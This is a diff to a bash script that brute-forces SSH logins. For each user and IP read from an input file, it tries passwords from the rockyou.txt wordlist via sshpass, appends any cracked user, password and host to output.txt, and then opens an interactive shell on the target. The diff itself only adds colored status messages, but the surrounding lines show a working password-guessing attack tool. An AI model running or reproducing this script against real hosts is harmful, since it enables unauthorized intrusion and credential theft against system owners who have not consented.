@@ -1,5 +1,10 @@
 
 
+Red=$'\e[1;31m'
+Green=$'\e[1;32m'
+Blue=$'\e[1;34m'
+Yellow=$'\e[1;33m'
+
 login () { #user, ip
 	output=output.txt
 
@@ -12,14 +17,16 @@ login () { #user, ip
 				if sshpass -p "$line" ssh -t -t $1@$2 -p 22 "set -- '$SSHPATH/$ID'.*; [ -e \"\$1\" ]";
 					then
 						pass="$line"
-						echo "Login Successful"
+						echo "$Yellow #####################################################"
+						echo "$Green Login Successful"
+						echo "$Yellow #####################################################"
 						echo "$1 $pass $2" | tee -a $output 									
 						break
 				fi
 			done < rockyou.txt
 			sshpass -p "$pass" ssh -t -t "$1"@"$2" -p 22
 		else
-			echo "Port is closed"
+			echo "$Red Port is closed!!!"
 	fi
 
 }
@@ -40,7 +47,7 @@ do
 	IP="$i"
 	done
 
-	echo "Attempting to login to $USER..."
+	echo "$Blue Attempting to login to $USER..."
 	login $USER $IP &
 	
 done < input.txt
